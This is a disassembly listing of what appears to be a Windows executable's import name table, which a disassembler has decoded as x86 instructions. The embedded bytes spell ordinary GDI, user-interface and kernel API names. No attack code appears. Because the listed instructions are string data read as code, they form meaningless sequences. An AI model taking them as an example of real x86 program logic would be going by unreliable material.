  412c98:	jb     0x412d01
  412c9a:	inc    ebp
  412c9b:	js     0x412c9d
  412c9d:	add    BYTE PTR [ecx+0x1],bh
  412ca0:	inc    edi
  412ca1:	gs je  0x412cf7
  412ca4:	jns    0x412d19
  412ca6:	je     0x412d0d
  412ca8:	ins    DWORD PTR es:[edi],dx
  412ca9:	push   eax
  412caa:	popa   
  412cab:	ins    BYTE PTR es:[edi],dx
  412cac:	gs je  0x412d23
  412caf:	gs inc ebp
  412cb1:	outs   dx,BYTE PTR ds:[esi]
  412cb2:	je     0x412d26
  412cb4:	imul   esp,DWORD PTR [ebp+0x73],0x57021400
  412cbb:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  412cc3:	add    BYTE PTR [edi+0x1],ah
  412cc6:	inc    edi
  412cc7:	gs je  0x412d19
  412cca:	bound  ebp,QWORD PTR [edx+0x65]
  412ccd:	arpl   WORD PTR [ecx+eax*2+0x0],si
  412cd1:	add    BYTE PTR [ebx+0x74654701],cl
  412cd7:	push   esp
  412cd8:	gs js  0x412d4f
  412cdb:	dec    ebp
  412cdc:	gs je  0x412d51
  412cdf:	imul   esp,DWORD PTR [ebx+0x73],0x16e0057
  412ce6:	inc    edi
  412ce7:	gs je  0x412d3a
  412cea:	imul   edi,DWORD PTR [eax+0x65],0xc100006c
  412cf1:	add    DWORD PTR [edx+0x65],edx
  412cf4:	ins    DWORD PTR es:[edi],dx
  412cf5:	outs   dx,DWORD PTR ds:[esi]
  412cf6:	jbe    0x412d5d
  412cf8:	inc    esi
  412cf9:	outs   dx,DWORD PTR ds:[esi]
  412cfa:	outs   dx,BYTE PTR ds:[esi]
  412cfb:	je     0x412d4f
  412cfd:	gs jae 0x412d6f
  412d00:	jne    0x412d74
  412d02:	arpl   WORD PTR [ebp+0x57],sp
  412d05:	add    BYTE PTR [edx+0x63655201],bh
  412d0b:	je     0x412d63
  412d0d:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  412d14:	pop    edi
  412d15:	add    DWORD PTR [edi+0x65],eax
  412d18:	je     0x412d67
  412d1a:	popa   
  412d1b:	jo     0x412d6a
  412d1d:	outs   dx,DWORD PTR ds:[esi]
  412d1e:	fs add BYTE PTR gs:[eax],al
  412d22:	push   es
  412d23:	add    dl,BYTE PTR [ebx+0x74]
  412d26:	jb     0x412d8d
  412d28:	je     0x412d8d
  412d2a:	push   0x746c42
  412d2f:	add    BYTE PTR [esi+0x1],ah
  412d32:	inc    edi
  412d33:	gs je  0x412d84
  412d36:	gs popa 
  412d38:	jb     0x412d9f
  412d3a:	jae    0x412db0
  412d3c:	push   eax
  412d3d:	popa   
  412d3e:	ins    BYTE PTR es:[edi],dx
  412d3f:	gs je  0x412db6
  412d42:	gs dec ecx
  412d44:	outs   dx,BYTE PTR ds:[esi]
  412d45:	fs gs js 0x412d49
  412d49:	add    dh,bl
  412d4b:	add    DWORD PTR [ebx+0x65],edx
  412d4e:	je     0x412d94
  412d50:	dec    ecx
  412d51:	inc    edx
  412d52:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  412d5a:	imul   esp,DWORD PTR [ebx+0x65],0x47015c00
  412d61:	gs je  0x412db0
  412d64:	popa   
  412d65:	jns    0x412dd6
  412d67:	jne    0x412ddd
  412d69:	add    dl,bh
  412d6b:	add    DWORD PTR [ebx+0x65],edx
  412d6e:	je     0x412dc4
  412d70:	gs js  0x412de7
  412d73:	inc    ebx
  412d74:	outs   dx,DWORD PTR ds:[esi]
  412d75:	ins    BYTE PTR es:[edi],dx
  412d76:	outs   dx,DWORD PTR ds:[esi]
  412d77:	jb     0x412d79
  412d79:	add    BYTE PTR [esi+0x65724300],dl
  412d7f:	popa   
  412d80:	je     0x412de7
  412d82:	inc    ebp
  412d83:	ins    BYTE PTR es:[edi],dx
  412d84:	ins    BYTE PTR es:[edi],dx
  412d85:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  412d8c:	outs   dx,BYTE PTR ds:[esi]
  412d8d:	dec    ecx
  412d8e:	outs   dx,BYTE PTR ds:[esi]
  412d8f:	imul   esi,DWORD PTR fs:[edx+0x65],0x7f007463
  412d97:	add    DWORD PTR [edi+0x65],eax
  412d9a:	je     0x412df0
  412d9c:	gs js  0x412e13
  412d9f:	inc    ebx
  412da0:	outs   dx,DWORD PTR ds:[esi]
  412da1:	ins    BYTE PTR es:[edi],dx
  412da2:	outs   dx,DWORD PTR ds:[esi]
  412da3:	jb     0x412da5
  412da5:	add    BYTE PTR [ecx+0x74654701],cl
  412dab:	push   esp
  412dac:	gs js  0x412e23
  412daf:	inc    esi
  412db0:	popa   
  412db1:	arpl   WORD PTR [ebp+0x57],sp
  412db4:	add    BYTE PTR [eax],al
  412db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db7:	add    BYTE PTR [ebx+0x72],al
  412dba:	gs popa 
  412dbc:	je     0x412e23
  412dbe:	push   eax
  412dbf:	popa   
  412dc0:	ins    BYTE PTR es:[edi],dx
  412dc1:	gs je  0x412e38
  412dc4:	gs add bh,ch
  412dc7:	add    DWORD PTR [ebx+0x65],edx
  412dca:	je     0x412e1c
  412dcc:	imul   edi,DWORD PTR [eax+0x65],0xd000006c
  412dd3:	add    DWORD PTR [ebx+0x65],edx
  412dd6:	je     0x412e19
  412dd8:	bound  ebp,QWORD PTR [edi+0x72]
  412ddb:	je     0x412e2d
  412ddd:	jb     0x412e4e
  412ddf:	arpl   WORD PTR [eax],ax
  412de1:	add    dh,cl
  412de3:	add    BYTE PTR [ebp+0x78],al
  412de6:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  412dea:	gs inc ebx
  412dec:	ins    BYTE PTR es:[edi],dx
  412ded:	imul   esi,DWORD PTR [eax+0x52],0x746365
  412df4:	mov    esp,0x6c6c4500
  412df9:	imul   esi,DWORD PTR [eax+0x73],0x1c40065
  412e00:	push   edx
  412e01:	gs jae 0x412e6d
  412e04:	jp     0x412e6b
  412e06:	push   eax
  412e07:	popa   
  412e08:	ins    BYTE PTR es:[edi],dx
  412e09:	gs je  0x412e80
  412e0c:	gs add ah,cl
  412e0f:	add    DWORD PTR [ebx+0x65],edx
  412e12:	ins    BYTE PTR es:[edi],dx
  412e13:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  412e18:	imul   esi,DWORD PTR [eax+0x52],0xb3006e67
  412e1f:	add    DWORD PTR [eax+0x6f],edx
  412e22:	ins    BYTE PTR es:[edi],dx
  412e23:	jns    0x412e8c
  412e25:	outs   dx,DWORD PTR ds:[esi]
  412e26:	outs   dx,BYTE PTR ds:[esi]
  412e27:	add    BYTE PTR [edi+0x65724300],bl
  412e2d:	popa   
  412e2e:	je     0x412e95
  412e30:	dec    eax
  412e31:	popa   
  412e32:	ins    BYTE PTR es:[edi],dx
  412e33:	data16 je 0x412ea5
  412e36:	outs   dx,BYTE PTR ds:[esi]
  412e37:	gs push eax
  412e39:	popa   
  412e3a:	ins    BYTE PTR es:[edi],dx
  412e3b:	gs je  0x412eb2
  412e3e:	add    BYTE PTR gs:[edi+0x44],al
  412e42:	dec    ecx
  412e43:	xor    esi,DWORD PTR [edx]
  412e45:	cs fs ins BYTE PTR es:[edi],dx
  412e48:	ins    BYTE PTR es:[edi],dx
  412e49:	add    BYTE PTR [eax+eax*1+0x50],al
  412e4d:	popa   
  412e4e:	je     0x412eb8
  412e50:	inc    esi
  412e51:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  412e59:	jae    0x412e9c
  412e5b:	add    BYTE PTR [ebx+0x48],dl
  412e5e:	dec    esp
  412e5f:	push   edi
  412e60:	inc    ecx
  412e61:	push   eax
  412e62:	dec    ecx
  412e63:	cs fs ins BYTE PTR es:[edi],dx
  412e66:	ins    BYTE PTR es:[edi],dx
  412e67:	add    BYTE PTR [eax+0x1],dl
  412e6a:	inc    esi
  412e6b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  412e73:	outs   dx,DWORD PTR ds:[esi]
  412e74:	push   ebx
  412e75:	jns    0x412eea
  412e77:	je     0x412ede
  412e79:	ins    DWORD PTR es:[edi],dx
  412e7a:	push   esp
  412e7b:	imul   ebp,DWORD PTR [ebp+0x65],0x33a0000
  412e82:	dec    edi
  412e83:	jo     0x412eea
  412e85:	outs   dx,BYTE PTR ds:[esi]
  412e86:	inc    esi
  412e87:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5303db00
  412e8f:	gs popa 
  412e91:	jb     0x412ef6
  412e93:	push   0x68746150
  412e98:	inc    ecx
  412e99:	add    BYTE PTR [ecx],al
  412e9b:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  412e9f:	gs je  0x412f07
  412ea2:	inc    ebx
  412ea3:	jb     0x412f0e
  412ea5:	je     0x412f10
  412ea7:	arpl   WORD PTR [ecx+0x6c],sp
  412eaa:	push   ebx
  412eab:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  412eb0:	outs   dx,BYTE PTR ds:[esi]
  412eb1:	add    BYTE PTR [esi],bl
  412eb3:	add    al,BYTE PTR [edi+0x65]
  412eb6:	je     0x412f08
  412eb8:	jb     0x412f23
  412eba:	outs   dx,DWORD PTR ds:[esi]
  412ebb:	jb     0x412f26
  412ebd:	je     0x412f38
  412ebf:	inc    ebx
  412ec0:	ins    BYTE PTR es:[edi],dx
  412ec1:	popa   
  412ec2:	jae    0x412f37
  412ec4:	add    BYTE PTR [eax],al
  412ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec7:	add    BYTE PTR [ebx+0x61],al
  412eca:	outs   dx,BYTE PTR ds:[esi]
  412ecb:	arpl   WORD PTR [ebp+0x6c],sp
  412ece:	push   edi
  412ecf:	popa   
  412ed0:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  412ed8:	ins    DWORD PTR es:[edi],dx
  412ed9:	gs jb  0x412edc
  412edc:	dec    ebp
  412edd:	add    eax,0x7274736c
  412ee2:	ins    BYTE PTR es:[edi],dx
  412ee3:	outs   dx,BYTE PTR gs:[esi]
  412ee5:	inc    ecx
  412ee6:	add    BYTE PTR [eax],al
  412ee8:	mov    WORD PTR [ecx],es
  412eea:	inc    edi
  412eeb:	gs je  0x412f2f
  412eee:	je     0x412f5f
  412ef0:	ins    DWORD PTR es:[edi],dx
  412ef1:	dec    esi
  412ef2:	popa   
  412ef3:	ins    DWORD PTR es:[edi],dx
  412ef4:	gs push edi
  412ef6:	add    BYTE PTR [eax],al
  412ef8:	xor    eax,0x74655304
  412efd:	push   esp
  412efe:	push   0x64616572
  412f03:	inc    ecx
  412f04:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  412f0b:	dec    ebp
  412f0c:	popa   
  412f0d:	jae    0x412f7a
  412f0f:	add    BYTE PTR [ecx+0x6f6c4702],cl
  412f15:	bound  esp,QWORD PTR [ecx+0x6c]
  412f18:	inc    ecx
  412f19:	ins    BYTE PTR es:[edi],dx
  412f1a:	ins    BYTE PTR es:[edi],dx
  412f1b:	outs   dx,DWORD PTR ds:[esi]
  412f1c:	arpl   WORD PTR [eax],ax
  412f1e:	sbb    eax,0x74655304
  412f23:	dec    eax
  412f24:	popa   
  412f25:	outs   dx,BYTE PTR ds:[esi]
  412f26:	fs ins BYTE PTR es:[edi],dx
  412f28:	gs inc ebx
  412f2a:	outs   dx,DWORD PTR ds:[esi]
  412f2b:	jne    0x412f9b
  412f2d:	je     0x412f2f
  412f2f:	add    BYTE PTR [edx+0x2],ah
  412f32:	inc    edi
  412f33:	gs je  0x412f8a
  412f36:	gs ins DWORD PTR es:[edi],dx
  412f38:	jo     0x412f8a
  412f3a:	popa   
  412f3b:	je     0x412fa5
  412f3d:	push   edi
  412f3e:	add    BYTE PTR [eax],al
  412f40:	xchg   edx,eax
  412f41:	add    al,BYTE PTR [edi+0x6c]
  412f44:	outs   dx,DWORD PTR ds:[esi]
  412f45:	bound  esp,QWORD PTR [ecx+0x6c]
  412f48:	inc    edi
  412f49:	gs je  0x412f8d
  412f4c:	je     0x412fbd
  412f4e:	ins    DWORD PTR es:[edi],dx
  412f4f:	dec    esi
  412f50:	popa   
  412f51:	ins    DWORD PTR es:[edi],dx
  412f52:	gs push edi
  412f54:	add    BYTE PTR [eax],al
  412f56:	retf   0x4300
  412f59:	jb     0x412fc0
  412f5b:	popa   
  412f5c:	je     0x412fc3
  412f5e:	inc    ebp
  412f5f:	jbe    0x412fc6
  412f61:	outs   dx,BYTE PTR ds:[esi]
  412f62:	je     0x412fa5
  412f64:	add    BYTE PTR [eax],al
  412f66:	dec    edi
  412f67:	add    al,0x53
  412f69:	jne    0x412fde
  412f6b:	jo     0x412fd2
  412f6d:	outs   dx,BYTE PTR ds:[esi]
  412f6e:	fs push esp
  412f70:	push   0x64616572
  412f75:	add    BYTE PTR [ebx+0x2],ah
  412f78:	inc    edi
  412f79:	gs je  0x412fd0
  412f7c:	push   0x64616572
  412f81:	inc    ebx
  412f82:	outs   dx,DWORD PTR ds:[esi]
  412f83:	outs   dx,BYTE PTR ds:[esi]
  412f84:	je     0x412feb
  412f86:	js     0x412ffc
  412f88:	add    BYTE PTR [eax],al
  412f8a:	ret    
  412f8b:	add    al,0x6c
  412f8d:	jae    0x413003
  412f8f:	jb     0x412ff4
  412f91:	ins    DWORD PTR es:[edi],dx
  412f92:	jo     0x412feb
  412f94:	add    BYTE PTR [eax],al
  412f96:	retf   
  412f97:	add    cl,BYTE PTR [ecx+0x73]
  412f9a:	inc    edx
  412f9b:	popa   
  412f9c:	fs push edx
  412f9e:	gs popa 
  412fa0:	fs push eax
  412fa2:	je     0x413016
  412fa4:	add    BYTE PTR [eax],al
  412fa6:	int3   
  412fa7:	add    al,0x6c
  412fa9:	jae    0x41301f
  412fab:	jb     0x413010
  412fad:	jo     0x413028
  412faf:	outs   dx,BYTE PTR ds:[esi]
  412fb0:	push   edi
  412fb1:	add    dh,ah
  412fb3:	add    BYTE PTR [ebx+0x72],al
  412fb6:	gs popa 
  412fb8:	je     0x41301f
  412fba:	push   edx
  412fbb:	gs ins DWORD PTR es:[edi],dx
  412fbd:	outs   dx,DWORD PTR ds:[esi]
  412fbe:	je     0x413025
  412fc0:	push   esp
  412fc1:	push   0x64616572
  412fc6:	add    BYTE PTR [eax],al
  412fc8:	retf   
  412fc9:	add    DWORD PTR [edi+0x65],eax
  412fcc:	je     0x413011
  412fce:	jne    0x413042
  412fd0:	jb     0x413037
  412fd2:	outs   dx,BYTE PTR ds:[esi]
  412fd3:	je     0x413019
  412fd5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412fdc:	jns    0x413035
  412fde:	add    BYTE PTR [eax],al
  412fe0:	inc    edx
  412fe1:	add    al,BYTE PTR [edi+0x65]
  412fe4:	je     0x413039
  412fe6:	push   0x5074726f
  412feb:	popa   
  412fec:	je     0x413056
  412fee:	dec    esi
  412fef:	popa   
  412ff0:	ins    DWORD PTR es:[edi],dx
  412ff1:	gs inc ecx
  412ff3:	add    al,dl
  412ff5:	add    BYTE PTR [ebx+0x72],al
  412ff8:	gs popa 
  412ffa:	je     0x413061
  412ffc:	inc    esi
  412ffd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x45012000
  413005:	outs   dx,BYTE PTR ds:[esi]
  413006:	jne    0x413075
  413008:	push   edx
  413009:	gs jae 0x41307b
  41300c:	jne    0x413080
  41300e:	arpl   WORD PTR [ebp+0x4e],sp
  413011:	popa   
  413012:	ins    DWORD PTR es:[edi],dx
  413013:	gs jae 0x413057
  413016:	add    BYTE PTR [eax],al
  413018:	or     DWORD PTR [edx],eax
  41301a:	inc    edi
  41301b:	gs je  0x41306b
  41301e:	outs   dx,DWORD PTR ds:[esi]
  41301f:	fs jne 0x41308e
  413022:	gs inc esi
  413024:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41302c:	add    BYTE PTR [eax],al
  41302e:	ret    
  41302f:	add    edx,DWORD PTR [edx+0x74]
  413032:	ins    BYTE PTR es:[edi],dx
  413033:	push   ebp
  413034:	outs   dx,BYTE PTR ds:[esi]
  413035:	ja     0x4130a0
  413037:	outs   dx,BYTE PTR ds:[esi]
  413038:	add    BYTE PTR fs:[ebx],cl
  41303b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41303f:	popa   
  413040:	ins    BYTE PTR es:[edi],dx
  413041:	inc    ecx
  413042:	ins    BYTE PTR es:[edi],dx
  413043:	ins    BYTE PTR es:[edi],dx
  413044:	outs   dx,DWORD PTR ds:[esi]
  413045:	arpl   WORD PTR [eax],ax
  413047:	add    BYTE PTR [esp+eax*1+0x456e6957],dl
  41304e:	js     0x4130b5
  413050:	arpl   WORD PTR [eax],ax
  413052:	or     al,BYTE PTR [edx]
  413054:	inc    edi
  413055:	gs je  0x4130a5
  413058:	outs   dx,DWORD PTR ds:[esi]
  413059:	fs jne 0x4130c8
  41305c:	gs dec eax
  41305e:	popa   
  41305f:	outs   dx,BYTE PTR ds:[esi]
  413060:	fs ins BYTE PTR es:[edi],dx
  413062:	gs inc ecx
  413064:	add    BYTE PTR [eax],al
  413066:	sti    
  413067:	add    DWORD PTR [edi+0x65],eax
  41306a:	je     0x4130b8
  41306c:	popa   
  41306d:	jae    0x4130e3
  41306f:	inc    ebp
  413070:	jb     0x4130e4
  413072:	outs   dx,DWORD PTR ds:[esi]
  413073:	jb     0x413075
  413075:	add    BYTE PTR [edi+0x74654701],bl
  41307b:	inc    ebx
  41307c:	outs   dx,DWORD PTR ds:[esi]
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	jo     0x4130f5
  413080:	je     0x4130e7
  413082:	jb     0x4130d2
  413084:	popa   
  413085:	ins    DWORD PTR es:[edi],dx
  413086:	gs inc ecx
  413088:	add    BYTE PTR [eax],al
  41308a:	add    al,BYTE PTR [bx+0x65]
  41308e:	je     0x4130e4
  413090:	push   0x64616572
  413095:	dec    esp
  413096:	outs   dx,DWORD PTR ds:[esi]
  413097:	arpl   WORD PTR [ecx+0x6c],sp
  41309a:	gs add bl,dh
  41309d:	add    DWORD PTR [edi+0x65],eax
  4130a0:	je     0x4130e8
  4130a2:	jne    0x413110
  4130a4:	ins    BYTE PTR es:[edi],dx
  4130a5:	push   eax
  4130a6:	popa   
  4130a7:	je     0x413111
  4130a9:	dec    esi
  4130aa:	popa   
  4130ab:	ins    DWORD PTR es:[edi],dx
  4130ac:	gs push edi
  4130ae:	add    BYTE PTR [eax],al
  4130b0:	mov    ah,0x3
  4130b2:	push   edx
  4130b3:	gs ins DWORD PTR es:[edi],dx
  4130b5:	outs   dx,DWORD PTR ds:[esi]
  4130b6:	jbe    0x41311d
  4130b8:	inc    esp
  4130b9:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130c0:	jns    0x413119
  4130c2:	add    BYTE PTR [eax],al
  4130c4:	and    al,0x3
  4130c6:	dec    ebp
  4130c7:	popa   
  4130c8:	jo     0x413120
  4130ca:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR gs:[eax+0x4],al
  4130d6:	push   ebx
  4130d7:	gs je  0x41312e
  4130da:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4130e1:	jne    0x413148
  4130e3:	push   esp
  4130e4:	imul   ebp,DWORD PTR [ebp+0x65],0xf7000072
  4130eb:	add    DWORD PTR [edi+0x65],eax
  4130ee:	je     0x413138
  4130f0:	popa   
  4130f1:	outs   dx,BYTE PTR ds:[esi]
  4130f2:	fs ins BYTE PTR es:[edi],dx
  4130f4:	gs dec ecx
  4130f6:	outs   dx,BYTE PTR ds:[esi]
  4130f7:	outs   dx,WORD PTR ds:[esi]
  4130f9:	jb     0x413168
  4130fb:	popa   
  4130fc:	je     0x413167
  4130fe:	outs   dx,DWORD PTR ds:[esi]
  4130ff:	outs   dx,BYTE PTR ds:[esi]
  413100:	add    BYTE PTR [eax],al
  413102:	jmp    0x6946:0x74654701
  413109:	ins    BYTE PTR es:[edi],dx
  41310a:	gs inc ecx
  41310c:	je     0x413182
  41310e:	jb     0x413179
  413110:	bound  esi,QWORD PTR [ebp+0x74]
  413113:	gs jae 0x41315b
  413116:	js     0x413159
  413118:	add    BYTE PTR [eax],al
  41311a:	pop    ss
  41311b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41311f:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413123:	add    BYTE PTR gs:[eax],al
  413126:	mov    BYTE PTR [eax],al
  413128:	inc    ecx
  413129:	jb     0x413190
  41312b:	inc    esi
  41312c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  413134:	dec    esi
  413135:	push   ebx
  413136:	dec    ecx
  413137:	add    BYTE PTR [esi+0x1],ch
  41313a:	inc    esi
  41313b:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  413142:	jne    0x4131b6
  413144:	arpl   WORD PTR [ebp+0x45],sp
  413147:	js     0x4131a0
  413149:	add    BYTE PTR [ecx+0x1],bl
  41314c:	inc    esi
  41314d:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  413154:	add    BYTE PTR gs:0x74655304,ah
  41315b:	dec    ebp
  41315c:	popa   
  41315d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  413165:	outs   dx,WORD PTR ds:[esi]
  413167:	add    BYTE PTR [edx+0x65724601],al
  41316d:	gs dec esp
  41316f:	imul   esp,DWORD PTR [edx+0x72],0x797261
  413176:	js     0x41317b
  413178:	push   edx
  413179:	gs popa 
  41317b:	fs inc esi
  41317d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x53043c00
  413185:	gs je  0x4131dc
  413188:	push   0x64616572
  41318d:	push   eax
  41318e:	jb     0x4131f9
  413190:	outs   dx,DWORD PTR ds:[esi]
  413191:	jb     0x4131fc
  413193:	je     0x41320e
  413195:	add    BYTE PTR [ecx+0x2],ah
  413198:	inc    edi
  413199:	gs je  0x4131f0
  41319c:	gs ins DWORD PTR es:[edi],dx
  41319e:	jo     0x4131f0
  4131a0:	popa   
  4131a1:	je     0x41320b
  4131a3:	inc    ecx
  4131a4:	add    BYTE PTR [eax],al
  4131a6:	or     BYTE PTR [ecx],al
  4131a8:	inc    esp
  4131a9:	gs jbe 0x413215
  4131ac:	arpl   WORD PTR [ebp+0x49],sp
  4131af:	outs   dx,DWORD PTR ds:[esi]
  4131b0:	inc    ebx
  4131b1:	outs   dx,DWORD PTR ds:[esi]
  4131b2:	outs   dx,BYTE PTR ds:[esi]
  4131b3:	je     0x413227
  4131b5:	outs   dx,DWORD PTR ds:[esi]
  4131b6:	ins    BYTE PTR es:[edi],dx
  4131b7:	add    BYTE PTR [edi+0x1],cl
  4131ba:	inc    esi
  4131bb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  4131c3:	outs   dx,DWORD PTR ds:[esi]
  4131c4:	dec    esp
  4131c5:	outs   dx,DWORD PTR ds:[esi]
  4131c6:	arpl   WORD PTR [ecx+0x6c],sp
  4131c9:	inc    esi
  4131ca:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  4131d2:	repnz add BYTE PTR [ebx+0x72],al
  4131d6:	gs popa 
  4131d8:	je     0x41323f
  4131da:	push   edi
  4131db:	popa   
  4131dc:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4131e4:	ins    DWORD PTR es:[edi],dx
  4131e5:	gs jb  0x413229
  4131e8:	add    BYTE PTR [eax],al
  4131ea:	jns    0x4131ee
  4131ec:	inc    edi
  4131ed:	gs je  0x413246
  4131f0:	gs jb  0x413266
  4131f3:	imul   ebp,DWORD PTR [edi+0x6e],0x454b0000
  4131fa:	push   edx
  4131fb:	dec    esi
  4131fc:	inc    ebp
  4131fd:	dec    esp
  4131fe:	xor    esi,DWORD PTR [edx]
  413200:	cs fs ins BYTE PTR es:[edi],dx
  413203:	ins    BYTE PTR es:[edi],dx
  413204:	add    BYTE PTR [eax],al
  413206:	cmp    al,0x0
  413208:	inc    ebx
  413209:	push   0x4d6b6365
  41320e:	outs   dx,BYTE PTR gs:[esi]
  413210:	jne    0x413264
  413212:	popa   
  413213:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41321b:	add    BYTE PTR [edx+0x2],al
  41321e:	push   ebx
  41321f:	gs je  0x413268
  413222:	outs   dx,DWORD PTR ds:[esi]
  413223:	jb     0x41328a
  413225:	addr16 jb 0x413297
  413228:	jne    0x413298
  41322a:	fs push edi
  41322c:	imul   ebp,DWORD PTR [esi+0x64],0x5500776f
  413233:	add    DWORD PTR [edi+0x65],eax
  413236:	je     0x41328b
  413238:	arpl   WORD PTR [edx+0x6f],si
  41323b:	ins    BYTE PTR es:[edi],dx
  41323c:	ins    BYTE PTR es:[edi],dx
  41323d:	push   eax
  41323e:	outs   dx,DWORD PTR ds:[esi]
  41323f:	jae    0x413241
  413241:	add    ah,al
  413243:	add    DWORD PTR [ebp+0x61],ecx
  413246:	jo     0x41328c
  413248:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41324f:	arpl   WORD PTR [eax+eax*1+0x24],si
  413253:	add    BYTE PTR [ebx+0x68],al
  413256:	popa   
  413257:	outs   dx,BYTE PTR ds:[esi]
  413258:	addr16 gs dec ebp
  41325b:	outs   dx,BYTE PTR gs:[esi]
  41325d:	jne    0x4132b6
  41325f:	add    cl,bh
  413261:	add    BYTE PTR [edi+0x65],al
  413264:	je     0x4132a9
  413266:	ins    BYTE PTR es:[edi],dx
  413267:	popa   
  413268:	jae    0x4132dd
  41326a:	dec    esp
  41326b:	outs   dx,DWORD PTR ds:[esi]
  41326c:	outs   dx,BYTE PTR ds:[esi]
  41326d:	addr16 push edi
  41326f:	add    bh,al
  413271:	add    DWORD PTR [ebp+0x61],ecx
  413274:	jo     0x4132cc
  413276:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41327d:	gs jns 0x4132c5
  413280:	js     0x4132d9
  413282:	add    BYTE PTR [eax],al
  413284:	loop   0x413286
  413286:	inc    esi
  413287:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41328e:	outs   dx,DWORD PTR ds:[esi]
  41328f:	ja     0x4132d6
  413291:	js     0x4132d4
  413293:	add    BYTE PTR [edi+0x73694400],bl
  413299:	jo     0x4132fc
  41329b:	je     0x413300
  41329d:	push   0x7373654d
  4132a2:	popa   
  4132a3:	addr16 gs inc ecx
  4132a6:	add    BYTE PTR [eax],al
  4132a8:	mov    es,WORD PTR [ecx]
  4132aa:	dec    ecx
  4132ab:	jae    0x4132f0
  4132ad:	push   0x6c417261
  4132b2:	jo     0x41331c
  4132b4:	popa   
  4132b5:	dec    esi
  4132b6:	jne    0x413325
  4132b8:	gs jb  0x413324
  4132bb:	arpl   WORD PTR [edi+0x0],dx
  4132be:	push   ecx
  4132bf:	add    BYTE PTR [ebx+0x72],al
  4132c2:	gs popa 
  4132c4:	je     0x41332b
  4132c6:	inc    ebx
  4132c7:	popa   
  4132c8:	jb     0x41332f
  4132ca:	je     0x4132cc
  4132cc:	mov    dl,0x0
  4132ce:	inc    esp
  4132cf:	jb     0x413332
  4132d1:	ja     0x413319
  4132d3:	jb     0x413336
  4132d5:	ins    DWORD PTR es:[edi],dx
  4132d6:	gs inc ebx
  4132d8:	outs   dx,DWORD PTR ds:[esi]
  4132d9:	outs   dx,BYTE PTR ds:[esi]
  4132da:	je     0x41334e
  4132dc:	outs   dx,DWORD PTR ds:[esi]
  4132dd:	ins    BYTE PTR es:[edi],dx
  4132de:	add    BYTE PTR [eax],al
  4132e0:	inc    esi
  4132e1:	add    BYTE PTR [ebx+0x6c],al
  4132e4:	outs   dx,DWORD PTR ds:[esi]
  4132e5:	jae    0x41334c
  4132e7:	inc    esp
  4132e8:	gs jae 0x413356
  4132eb:	je     0x41335c
  4132ed:	jo     0x4132ef
  4132ef:	add    BYTE PTR [ebp+0x61694400],bl
  4132f5:	ins    BYTE PTR es:[edi],dx
  4132f6:	outs   dx,DWORD PTR ds:[esi]
  4132f7:	addr16 inc edx
  4132f9:	outs   dx,DWORD PTR ds:[esi]
  4132fa:	js     0x41334c
  4132fc:	popa   
  4132fd:	jb     0x413360
  4132ff:	ins    DWORD PTR es:[edi],dx
  413300:	push   edi
  413301:	add    BYTE PTR [edx],cl
  413303:	add    BYTE PTR [ecx+0x72],al
  413306:	jb     0x413369
  413308:	outs   dx,BYTE PTR ds:[esi]
  413309:	addr16 gs dec ecx
  41330c:	arpl   WORD PTR [edi+0x6e],bp
  41330f:	imul   esp,DWORD PTR [ebx+0x57],0x6f646e69
  413316:	ja     0x41338b
  413318:	add    BYTE PTR [eax],al
  41331a:	fld    QWORD PTR [eax]
  41331c:	inc    ebp
  41331d:	jno    0x413394
  41331f:	popa   
  413320:	ins    BYTE PTR es:[edi],dx
  413321:	push   edx
  413322:	arpl   WORD PTR gs:[eax+eax*1-0x45],si
  413327:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41332b:	fs push ebx
  41332d:	je     0x4133a1
  41332f:	imul   ebp,DWORD PTR [esi+0x67],0x1ee0041
  413336:	push   eax
  413337:	gs imul ecx,DWORD PTR gs:[ebp+0x65],0x73
  41333d:	jae    0x4133a0
  41333f:	addr16 gs inc ecx
  413342:	add    BYTE PTR [eax],al
  413344:	cmp    DWORD PTR [eax],eax
  413346:	inc    ebx
  413347:	push   0x70557261
  41334c:	jo     0x4133b3
  41334e:	jb     0x4133a7
  413350:	add    BYTE PTR [eax],al
  413352:	adc    eax,DWORD PTR [ecx]
  413354:	inc    edi
  413355:	gs je  0x41339c
